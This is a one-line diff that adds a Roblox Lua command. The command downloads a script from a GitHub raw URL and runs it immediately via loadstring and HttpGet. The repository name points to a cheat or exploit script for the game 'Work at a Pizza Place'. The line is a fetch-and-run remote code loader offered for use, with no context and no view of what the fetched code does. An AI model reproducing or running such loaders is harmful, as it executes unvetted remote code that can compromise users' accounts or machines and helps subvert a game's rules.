@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Cutsences/workatapizzaplace/main/scirpt%20(2).lua')))()
